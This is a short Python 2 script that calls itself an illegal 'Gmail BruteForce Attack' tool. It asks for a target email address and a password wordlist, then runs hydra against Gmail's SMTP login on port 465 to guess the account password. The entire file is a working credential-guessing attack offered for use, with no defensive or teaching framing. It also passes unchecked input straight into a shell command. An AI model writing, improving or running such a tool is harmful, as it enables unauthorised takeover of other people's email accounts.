import sys,time,os
import random

def menu():
	print "[+] Gmail BruteForce Attack [+]"
	print "[!] This is illegal program [!]"
	print "[--] Author : Rizal Solehudin [--]"
	print "BETA Version / 0.1"

print ""
print "          +------------------------------+"
print "          |       Gmail Brute Force      |"
print "          +------------------------------+"
print ""
print ""
email = raw_input("[*] Email : ")
word = raw_input("[*] Wordlist : ")
os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))


menu()